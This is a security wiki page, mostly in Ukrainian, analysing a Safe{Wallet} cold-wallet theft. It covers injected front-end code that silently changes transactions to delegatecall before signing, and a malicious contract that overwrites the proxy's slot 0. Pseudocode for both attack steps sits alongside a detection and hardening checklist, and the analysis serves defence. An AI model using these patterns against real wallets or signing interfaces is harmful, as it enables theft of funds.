# Web3 Signing Workflow Compromise & Safe Delegatecall Proxy Takeover

{{#include ../../banners/hacktricks-training.md}}

## Огляд

Ланцюжок крадіжки cold-wallet поєднав **компроміс у ланцюжку постачання веб-UI Safe{Wallet}** з **on-chain delegatecall примітивом, що перезаписав вказівник реалізації проксі (slot 0)**. Головні висновки:

- Якщо dApp може інжектити код у шлях підписання, він може змусити підписувача згенерувати дійсний **EIP-712 signature над полями, обраними атакуючим**, одночасно відновивши оригінальні дані UI, щоб інші підписувачі нічого не підозрювали.
- Safe проксі зберігають `masterCopy` (implementation) у **storage slot 0**. Delegatecall до контракту, який записує в slot 0, фактично «апгрейдить» Safe до логіки атакуючого, даючи повний контроль над гаманцем.

## Off-chain: Targeted signing mutation in Safe{Wallet}

Підроблений бандл Safe (`_app-*.js`) селективно атакував конкретні адреси Safe та підписувачів. Інжектована логіка виконувалася безпосередньо перед викликом підписання:
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Властивості атаки
- **Context-gated**: жорстко закодовані allowlists для постраждалих Safe/підписувачів зменшували шум і ускладнювали виявлення.
- **Last-moment mutation**: поля (`to`, `data`, `operation`, gas) перезаписувалися безпосередньо перед `signTransaction`, потім відновлювалися, тож payload пропозицій в UI виглядав безпечним, тоді як підписи відповідали payload зловмисника.
- **EIP-712 opacity**: гаманці показували структуровані дані, але не декодували вкладений calldata і не підкреслювали `operation = delegatecall`, через що модифіковане повідомлення фактично підписувалося всліпу.

### Актуальність валідації Gateway
Safe proposals відправляються до **Safe Client Gateway**. До посилення перевірок gateway міг прийняти пропозицію, в якій `safeTxHash`/signature відповідали іншим полям, ніж тіло JSON, якщо UI перезаписував їх після підпису. Після інциденту gateway тепер відхиляє пропозиції, хеш/підпис яких не відповідає надісланій транзакції. Аналогічна серверна верифікація хешів повинна застосовуватися для будь-якого signing-orchestration API.

## On-chain: Delegatecall proxy takeover via slot collision

Safe proxies зберігають `masterCopy` у **storage slot 0** і делегують усю логіку йому. Оскільки Safe підтримує **`operation = 1` (delegatecall)**, будь-яка підписана транзакція може вказувати на довільний контракт і виконувати його код в контексті storage проксі.

Зловмисний контракт імітував ERC-20 `transfer(address,uint256)`, але натомість записав `_to` у slot 0:
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Execution path:
1. Victims sign `execTransaction` with `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Safe masterCopy перевіряє підписи щодо цих параметрів.
3. Proxy виконує `delegatecall` у `attackerContract`; тіло `transfer` записує слот 0.
4. Slot 0 (`masterCopy`) тепер вказує на логіку, контрольовану атакуючим → **повне захоплення гаманця та виведення коштів**.

## Контрольний список для виявлення та посилення захисту

- **Цілісність UI**: pin JS assets / SRI; моніторьте зміни бандлів; розглядайте інтерфейс підписання як частину межі довіри.
- **Sign-time validation**: hardware wallets with **EIP-712 clear-signing**; явно відображайте `operation` та декодуйте вкладений calldata. Відхиляйте підпис, коли `operation = 1`, якщо політика цього не дозволяє.
- **Server-side hash checks**: шлюзи/сервіси, що ретранслюють пропозиції, повинні повторно обчислювати `safeTxHash` і перевіряти, що підписи відповідають поданим полям.
- **Policy/allowlists**: preflight-правила для `to`, селекторів, типів активів і заборона `delegatecall`, окрім перевірених потоків. Вимагайте внутрішній сервіс політик перед трансляцією повністю підписаних транзакцій.
- **Contract design**: уникайте відкриття довільного `delegatecall` у multisig/treasury гаманцях, якщо це не строго необхідно. Розміщуйте вказівники апгрейду поза слотом 0 або захищайте їх явною логікою апгрейду та контролем доступу.
- **Monitoring**: сповіщайте про виконання `delegatecall` з гаманців, що містять кошти казначейства, та про пропозиції, які змінюють `operation` від типових `call` патернів.

## References

- [In-depth technical analysis of the Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
